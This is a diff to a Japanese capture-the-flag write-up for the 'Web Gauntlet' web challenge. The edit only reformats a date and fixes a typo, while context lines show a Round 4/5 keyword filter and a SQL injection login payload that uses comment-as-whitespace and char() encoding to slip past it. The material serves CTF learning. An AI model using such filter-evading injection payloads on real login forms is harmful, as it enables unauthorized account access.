@@ -1,4 +1,4 @@
-#### 2021/01/09 作成
+#### 作成日: 2021/01/09
 
 # [Web] Web Gauntlet - 200 points
 
@@ -37,7 +37,7 @@ password: ```任意の文字```
 
 ### Round 4/5
 filter.phpに```Round4: or and = like > < -- admin```と表示される。  
-今度は```admin```という文字列が使用できないためasciii変換を行い、またSELECT文を追加してUNION句で統合させる。  
+今度は```admin```という文字列が使用できないためascii変換を行い、またSELECT文を追加してUNION句で統合させる。  
 username: ```'/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*```  
 password: ```任意の文字```  
 
